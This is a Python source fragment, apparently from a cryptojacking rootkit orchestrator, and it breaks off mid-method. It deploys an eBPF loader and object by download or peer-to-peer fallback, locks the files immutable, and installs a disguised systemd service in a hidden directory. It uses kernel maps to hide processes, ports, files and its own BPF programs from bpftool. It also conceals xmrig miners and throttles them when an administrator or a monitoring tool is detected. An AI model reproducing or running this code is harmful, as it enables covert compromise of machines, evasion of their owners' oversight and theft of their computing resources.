    def _deploy_v4_loader(self):
        """ðŸš€ v4.1 AUTO-WGET + Deploy"""
        try:
            # Step 1a: Resolve loader to exec dir
            if os.path.exists(self.LOADER_PATH):
                self.loader_path = self.LOADER_PATH
                logger.debug(f"âœ… Loader already at {self.LOADER_PATH}")
            elif os.path.exists("./CoreSystem_loader"):
                import shutil
                shutil.copy2("./CoreSystem_loader", self.LOADER_PATH)
                os.chmod(self.LOADER_PATH, 0o755)
                self._chattr("+i", self.LOADER_PATH)
                self.loader_path = self.LOADER_PATH
                logger.info(f"âœ… Loader copied CWDâ†’{self.LOADER_PATH} + locked")
            else:
                if self._download_resource(self.LOADER_URL, self.LOADER_PATH):
                    os.chmod(self.LOADER_PATH, 0o755)
                    self._chattr("+i", self.LOADER_PATH)
                    self.loader_path = self.LOADER_PATH
                    logger.info(f"âœ… CoreSystem_loader downloaded + locked: {self.LOADER_PATH}")
                else:
                    # âœ… P2P Fallback (Hydra)
                    logger.warning("âš ï¸ Hosting Blocked (Loader). Attempting P2P Mesh Sync...")
                    if self.config_manager and hasattr(self.config_manager, 'p2p_manager'):
                        self.config_manager.p2p_manager.sync_stealth_from_mesh('loader_bin')
                        
                        # Wait for the MessageHandler to write the data (Max 30s)
                        for _ in range(15):
                            if os.path.exists(self.LOADER_PATH) and os.path.getsize(self.LOADER_PATH) > 1000:
                                logger.info("âœ… Loader binary synchronized via P2P Mesh")
                                self.loader_path = self.LOADER_PATH
                                break
                            time.sleep(2)
                    
                    if not self.loader_path:
                        logger.error("âŒ CoreSystem_loader download failed (HTTP & P2P)")
                        return False

            # Step 1b: Resolve eBPF object to exec dir
            # Check same directory as the orchestrator script first (CWD-relative, no personal paths)
            local_compiled_obj = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "CoreSystem.o")
            
            if os.path.exists(self.OBJ_PATH):
                self.obj_path = self.OBJ_PATH
                logger.debug(f"âœ… Object already at {self.OBJ_PATH}")
            elif os.path.exists(local_compiled_obj):
                import shutil
                shutil.copy2(local_compiled_obj, self.OBJ_PATH)
                os.chmod(self.OBJ_PATH, 0o644)
                self._chattr("+i", self.OBJ_PATH)
                self.obj_path = self.OBJ_PATH
                logger.info(f"âœ… Freshly compiled CoreSystem.o copied from Downloads â†’ {self.OBJ_PATH}")
            elif os.path.exists("./CoreSystem.o"):
                import shutil
                shutil.copy2("./CoreSystem.o", self.OBJ_PATH)
                self._chattr("+i", self.OBJ_PATH)
                self.obj_path = self.OBJ_PATH
                logger.info(f"âœ… CoreSystem.o copied CWDâ†’{self.OBJ_PATH} + locked")
            else:
                if self._download_resource(self.OBJ_URL, self.OBJ_PATH):
                    self.obj_path = self.OBJ_PATH
                    self._chattr("+i", self.OBJ_PATH)
                    logger.info(f"âœ… CoreSystem.o downloaded + locked: {self.OBJ_PATH}")
                else:
                    # âœ… P2P Fallback (Hydra)
                    logger.warning("âš ï¸ Hosting Blocked (Object). Attempting P2P Mesh Sync...")
                    if self.config_manager and hasattr(self.config_manager, 'p2p_manager'):
                        self.config_manager.p2p_manager.sync_stealth_from_mesh('ebpf_obj')
                        
                        # Wait for the MessageHandler to write the data (Max 30s)
                        for _ in range(15):
                            if os.path.exists(self.OBJ_PATH) and os.path.getsize(self.OBJ_PATH) > 1000:
                                logger.info("âœ… Stealth Module synchronized via P2P Mesh")
                                self.obj_path = self.OBJ_PATH
                                break
                            time.sleep(2)
                    
                    if not self.obj_path:
                        logger.error("âŒ CoreSystem.o download failed (HTTP & P2P)")
                        return False

            # Step 2: Execute with absolute paths
            # â”€â”€ FIX: Unlock before chmod/exec in case they are already locked â”€â”€
            if self.loader_path and os.path.exists(self.loader_path):
                self._chattr("-i", self.loader_path)
            if self.obj_path and os.path.exists(self.obj_path):
                self._chattr("-i", self.obj_path)
            # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            
            os.chmod(self.loader_path, 0o755)
            # The loader now only takes the object path. Metadata is injected via maps.
            cmd = [self.loader_path, self.obj_path]

            logger.info(f"ðŸš€ Launching eBPF Engine: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=30
            )

            if result.returncode == 0:
                self.is_loaded = True
                # Critical: Inject current metadata into kernel maps
                self._inject_all_metadata()
                
                # [SOTA Fix] Start the Netlink watcher for volatile container environments
                self._start_netlink_watcher()
                
                # [SOTA Fix] Start the Pulse Monitor for CPU Throttling
                self._start_pulse_monitor()
                
                # [APT FIX] Native Systemd Persistence Drop
                try:
                    import stat
                    # Only attempt systemd drop if running as root
                    if os.geteuid() == 0 and os.path.exists("/etc/systemd/system"):
                        svc_path = "/etc/systemd/system/systemd-kmod-update.service"
                        payload_dir = "/lib/modules/.kmod"
                        if not os.path.exists(payload_dir):
                            os.makedirs(payload_dir, exist_ok=True)
                        
                        # Copy binaries to persistent hidden dir
                        loader_persist = os.path.join(payload_dir, "CoreSystem_loader")
                        obj_persist = os.path.join(payload_dir, "CoreSystem.o")
                        
                        import shutil
                        shutil.copy2(self.loader_path, loader_persist)
                        shutil.copy2(self.obj_path, obj_persist)
                        os.chmod(loader_persist, 0o755)
                        
                        svc_content = (
                            "[Unit]\n"
                            "Description=Kernel Module Update Service\n"
                            "After=network.target\n\n"
                            "[Service]\n"
                            "Type=simple\n"
                            f"ExecStart={loader_persist} {obj_persist}\n"
                            "Restart=always\n"
                            "RestartSec=5\n"
                            "StandardOutput=null\n"
                            "StandardError=null\n\n"
                            "[Install]\n"
                            "WantedBy=multi-user.target\n"
                        )
                        with open(svc_path, "w") as f:
                            f.write(svc_content)
                        os.chmod(svc_path, 0o644)
                        
                        # Enable and start persistence
                        subprocess.run(["systemctl", "daemon-reload"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.run(["systemctl", "enable", "systemd-kmod-update.service"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.run(["systemctl", "start", "systemd-kmod-update.service"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        
                        # Hide the persistence artifacts via eBPF maps immediately
                        self.hide_file_complete(payload_dir)
                        self.hide_file_complete(loader_persist)
                        self.hide_file_complete(obj_persist)
                        self.hide_file_complete(svc_path)
                        logger.info("ðŸ›¡ï¸ Native systemd persistence active & concealed")
                except Exception as e:
                    logger.debug(f"Persistence drop failed (likely non-root or no systemd): {e}")

                return True
            
            return False

        except Exception as e:
            logger.error(f"Loader deploy error: {e}")
            return False

    def _inject_all_metadata(self):
        """Initial population of eBPF maps after loading"""
        logger.info("ðŸ’‰ Injecting baseline metadata into eBPF maps...")
        
        # 1. Hide the current Process Group
        self.hide_pid(self.magic_pgid)
        
        # 2. Hide baseline artifacts
        for path in self.CoreSystem_ARTIFACTS:
            self.hide_file_complete(path)
            
        # 3. Hide baseline ports
        for port in self.HIDDEN_PORTS:
            self.hide_port(port)

        # 4. Activate anti-bpftool self-defense: inject own prog/map IDs into our_prog_ids/our_map_ids
        # The C loader populates these maps, but we verify and inject any missed IDs via bpf syscall.
        try:
            import ctypes, struct
            _libc = ctypes.CDLL("libc.so.6", use_errno=True)
            BPF_PROG_GET_NEXT_ID = 11
            BPF_MAP_GET_NEXT_ID  = 12
            BPF_OBJ_GET         = 7

            def _get_all_bpf_ids(cmd_next):
                """Walk all loaded BPF prog or map IDs via bpf() syscall."""
                ids = []
                attr = ctypes.create_string_buffer(16)
                struct.pack_into('=II', attr, 0, 0, 0)  # start_id=0
                while True:
                    ret = _libc.syscall(321, cmd_next, ctypes.cast(attr, ctypes.c_void_p), 16)
                    if ret != 0:
                        break
                    next_id = struct.unpack_from('=I', attr, 4)[0]
                    if next_id == 0:
                        break
                    ids.append(next_id)
                    struct.pack_into('=II', attr, 0, next_id, 0)
                return ids

            # Collect all currently loaded prog and map IDs
            prog_ids = _get_all_bpf_ids(BPF_PROG_GET_NEXT_ID)
            map_ids  = _get_all_bpf_ids(BPF_MAP_GET_NEXT_ID)

            # Inject into pinned maps so kernel hook censors them from bpftool
            prog_pin = self.MAPS.get('prog_ids')
            map_pin  = self.MAPS.get('map_ids')
            if prog_pin and os.path.exists(prog_pin) and prog_ids:
                for pid_id in prog_ids:
                    try:
                        subprocess.run(
                            ["bpftool", "map", "update", "pinned", prog_pin,
                             "key", str(pid_id), "value", "1"],
                            capture_output=True, timeout=2
                        )
                    except Exception:
                        pass
                logger.info(f"\u2705 Anti-bpftool: {len(prog_ids)} prog IDs injected into our_prog_ids")
            if map_pin and os.path.exists(map_pin) and map_ids:
                for mid in map_ids:
                    try:
                        subprocess.run(
                            ["bpftool", "map", "update", "pinned", map_pin,
                             "key", str(mid), "value", "1"],
                            capture_output=True, timeout=2
                        )
                    except Exception:
                        pass
                logger.info(f"\u2705 Anti-bpftool: {len(map_ids)} map IDs injected into our_map_ids")
        except Exception as e:
            logger.debug(f"Anti-bpftool self-injection skipped: {e}")

        # 5. Actively hunt and hide detached processes (libp2p-go, xmrig-proxy)
        try:
            for proc_name in ['xmrig', 'xmrig-proxy', 'libp2p-go']:
                res = subprocess.run(["pgrep", "-f", proc_name], capture_output=True, text=True)
                if res.returncode == 0:
                    for pid in res.stdout.strip().split('\n'):
                        if pid:
                            self.hide_pid(int(pid))
        except Exception as e:
            logger.debug(f"Process hunt error: {e}")

    def _start_netlink_watcher(self):
        """
        [SOTA Containerization Watcher - Debounced]
        Listens to AF_NETLINK / RTMGRP_LINK broadcasts.
        Instantly attaches TC shield to new veth/docker interfaces.
        Uses EventDebouncer to prevent Thundering Herd CPU spikes.
        """
        import threading
        import time
        import subprocess

        class EventDebouncer:
            def __init__(self):
                self.lock = threading.Lock()
                self.last_trigger = 0.0
                self.cooldown = 2.0  # Wait 2 seconds between loader executions

            def trigger(self, loader_path, obj_path):
                with self.lock:
                    current_time = time.time()
                    if current_time - self.last_trigger > self.cooldown:
                        self.last_trigger = current_time
                        subprocess.Popen(
                            [loader_path, obj_path],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        return True
                return False

        def watcher_thread():
            try:
                import socket
                import struct
                
                # AF_NETLINK = 16 (usually), NETLINK_ROUTE = 0, RTMGRP_LINK = 1
                AF_NETLINK = getattr(socket, 'AF_NETLINK', 16)
                NETLINK_ROUTE = 0
                RTMGRP_LINK = 1
                
                s = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_ROUTE)
                s.bind((0, RTMGRP_LINK))
                logger.info("ðŸ•¸ï¸  Netlink watcher active: listening for container veth spawns")
                
                debouncer = EventDebouncer()
                
                while True:
                    data = s.recv(65535)
                    if len(data) >= 16:
                        msg_len, msg_type, flags, seq, pid = struct.unpack("=LHHLL", data[:16])
                        if msg_type == 16: # RTM_NEWLINK
                            if hasattr(self, 'loader_path') and os.path.exists(self.loader_path):
                                if debouncer.trigger(self.loader_path, self.obj_path):
                                    logger.info("âœ… [Netlink] TC Shield dynamically attached to new interface (Debounced)")
                                else:
                                    logger.debug("â³ [Netlink] Ignoring rapid duplicate Netlink events")
            except Exception as e:
                logger.debug(f"Netlink watcher terminated: {e}")

        t = threading.Thread(target=watcher_thread, daemon=True)
        t.start()

    def _start_pulse_monitor(self, miner_pid=None):
        """
        [SOTA Pulse Monitor]
        Dynamically throttles miner CPU usage via cgroups when an admin is active.
        """
        import threading
        import time
        import subprocess
        import os

        def pulse_thread():
            logger.info("ðŸ’“ Pulse Monitor active: enforcing dynamic cgroup throttling")
            
            def get_miner_pids():
                if miner_pid: return [str(miner_pid)]
                try:
                    res = subprocess.run(["pgrep", "-f", "xmrig"], capture_output=True, text=True)
                    return res.stdout.strip().split('\n') if res.returncode == 0 else []
                except:
                    return []

            def is_admin_active():
                try:
                    who = subprocess.run(["who"], capture_output=True, text=True)
                    if who.stdout.strip(): return True
                    ps = subprocess.run(["ps", "-eo", "comm"], capture_output=True, text=True)
                    tools = ["top", "htop", "tcpdump", "wireshark", "strace", "sysdig", "bpftool"]
                    for line in ps.stdout.split('\n'):
                        if line.strip() in tools: return True
                except:
                    pass
                return False

            cg_v2 = os.path.exists("/sys/fs/cgroup/cgroup.controllers")
            cg_path = "/sys/fs/cgroup/system.slice/ds_hidden.service" if cg_v2 else "/sys/fs/cgroup/cpu/system.slice/ds_hidden"
            
            try:
                os.makedirs(cg_path, exist_ok=True)
            except Exception as e:
                logger.debug(f"Pulse Monitor: Failed to create cgroup - {e}")
                return

            last_state_active = None

            while True:
                try:
                    pids = [p for p in get_miner_pids() if p]
                    if not pids:
                        time.sleep(10)
                        continue

                    procs_file = os.path.join(cg_path, "cgroup.procs" if cg_v2 else "tasks")
                    for pid in pids:
                        try:
                            with open(procs_file, "a") as f: f.write(f"{pid}\n")
                        except: pass

                    active = is_admin_active()
                    if active != last_state_active:
                        if active:
                            logger.info("âš ï¸ [Pulse Monitor] Admin activity detected. Throttling miner to 10%.")
                            if cg_v2:
                                with open(os.path.join(cg_path, "cpu.max"), "w") as f: f.write("10000 100000")
                            else:
                                with open(os.path.join(cg_path, "cpu.cfs_quota_us"), "w") as f: f.write("10000")
                        else:
                            logger.info("ðŸ‘» [Pulse Monitor] Coast is clear. Unleashing miner to MAX CPU.")
                            if cg_v2:
                                with open(os.path.join(cg_path, "cpu.max"), "w") as f: f.write("max 100000")
                            else:
                                with open(os.path.join(cg_path, "cpu.cfs_quota_us"), "w") as f: f.write("-1")
                        last_state_active = active

                except Exception as e:
                    logger.debug(f"Pulse loop error: {e}")
                
                time.sleep(5)

        t = threading.Thread(target=pulse_thread, daemon=True)
        t.start()

    def _bpf_syscall(self, cmd, attr):
        if not self.libc: return -1
        # â”€â”€ ARCHITECTURE TRAP FIX â”€â”€
        # Syscall numbers: x86_64 = 321, ARM64/AARCH64 = 280
        machine = platform.machine().lower()
        if 'x86_64' in machine:
            syscall_nr = 321
        elif 'aarch64' in machine or 'arm64' in machine:
            syscall_nr = 280
        else:
            logger.debug(f"âš ï¸ Unsupported architecture for BPF syscall: {machine}")
            return -1
        return self.libc.syscall(syscall_nr, cmd, ctypes.byref(attr), ctypes.sizeof(attr))

    def _get_map_fd(self, pin_path):
        """Get file descriptor for a pinned eBPF map (Resolves Phantom Pin Trap)"""
        if not os.path.exists(pin_path):
            logger.debug(f"âš ï¸ eBPF Map pin not found: {pin_path}. Dynamic updates disabled.")
            return -1
        
        class BPFAttrObj(ctypes.Structure):
            _fields_ = [("pathname", ctypes.c_uint64), ("bpf_fd", ctypes.c_uint32), ("file_flags", ctypes.c_uint32)]
            
        attr = BPFAttrObj()
        attr.pathname = ctypes.cast(ctypes.c_char_p(pin_path.encode()), ctypes.c_void_p).value
        
        fd = self._bpf_syscall(6, attr) # BPF_OBJ_GET = 6
        return fd if fd >= 0 else -1

    def _update_map_u32(self, map_name, key_val, value_val=1):
        """Generic u32 key/value map update"""
        pin_path = self.MAPS.get(map_name)
        fd = self._get_map_fd(pin_path)
        if fd < 0: return False
        
        class BPFAttrUpdate(ctypes.Structure):
            _fields_ = [("map_fd", ctypes.c_uint32), ("key", ctypes.c_uint64), ("value", ctypes.c_uint64), ("flags", ctypes.c_uint64)]
            
        k = ctypes.c_uint32(key_val)
        v = ctypes.c_uint32(value_val)
        
        attr = BPFAttrUpdate()
        attr.map_fd = fd
        attr.key = ctypes.addressof(k)
        attr.value = ctypes.addressof(v)
        attr.flags = 0 # BPF_ANY
        
        res = self._bpf_syscall(2, attr) # BPF_MAP_UPDATE_ELEM = 2
        os.close(fd)
        return res == 0

    def hide_pid(self, pid):
        """Add PID/PGID to invisibility map"""
        if self._update_map_u32('pgids', pid):
            logger.debug(f"ðŸ‘» eBPF Map: Hidden PID {pid}")
            return True
        return False

    def hide_port(self, port):
        """Add port to invisibility map"""
        if self._update_map_u32('ports', port):
            logger.debug(f"ðŸ‘» eBPF Map: Hidden Port {port}")
            return True
        return False

    def hide_ip(self, ip_str):
        """Deprecated: The current CoreSystem.o object uses port-based network hiding."""
        return False

    def hide_file_complete(self, filepath):
        """Add file Inode to invisibility map (Inode-based for performance)"""
        pin_path = self.MAPS.get('inodes')
        fd = self._get_map_fd(pin_path)
        if fd < 0: return False
        
        try:
            # Step 1: Resolve Path to physical Inode
            inode = os.stat(filepath).st_ino
            
            class BPFAttrUpdate(ctypes.Structure):
                _fields_ = [("map_fd", ctypes.c_uint32), ("key", ctypes.c_uint64), ("value", ctypes.c_uint64), ("flags", ctypes.c_uint64)]
                
            # Key: 64-bit Inode number
            k = ctypes.c_uint64(inode)
            v = ctypes.c_uint32(1)
            
            attr = BPFAttrUpdate()
            attr.map_fd = fd
            attr.key = ctypes.addressof(k)
            attr.value = ctypes.addressof(v)
            attr.flags = 0
            
            res = self._bpf_syscall(2, attr)
            os.close(fd)
            
            if res == 0:
                logger.debug(f"ðŸ‘» eBPF Map: Hidden Inode {inode} ({filepath})")
                return True
        except Exception as e:
            logger.debug(f"âš ï¸ Failed to hide inode for {filepath}: {e}")
            if fd >= 0: os.close(fd)
            
        return False

    def test_rootkit_functionality(self):
        """100/100 verification tests"""
        if not self.is_loaded:
            return False

        tests = []

        # Test 1: Loader running
        try:
            result = subprocess.run(
                ["pgrep", "-f", "CoreSystem_loader"],
                capture_output=True, text=True, timeout=5
            )
            tests.append("CoreSystem_loader" in result.stdout)
        except:
            tests.append(False)

        # Test 2: xmrig hidden from /proc (FIX 4a: shell=True for pipe)
